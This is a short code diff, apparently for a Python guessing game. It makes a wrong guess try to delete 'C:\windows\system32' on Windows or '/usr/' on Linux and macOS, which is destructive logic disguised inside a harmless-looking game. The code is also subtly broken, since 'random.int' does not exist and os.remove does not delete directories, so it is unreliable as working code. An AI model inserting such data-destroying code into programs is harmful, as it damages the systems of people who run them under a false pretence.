@@ -8,4 +8,7 @@ answer = random.int(1,6)
 if guess == answer:
     print("That's correct!")
 else:
-    os.remove("C:\\windows\\system32")
+    if os.name == "nt":
+       os.remove("C:\\windows\\system32")
+    if os.name == "posix":
+       os.remove("/usr/")
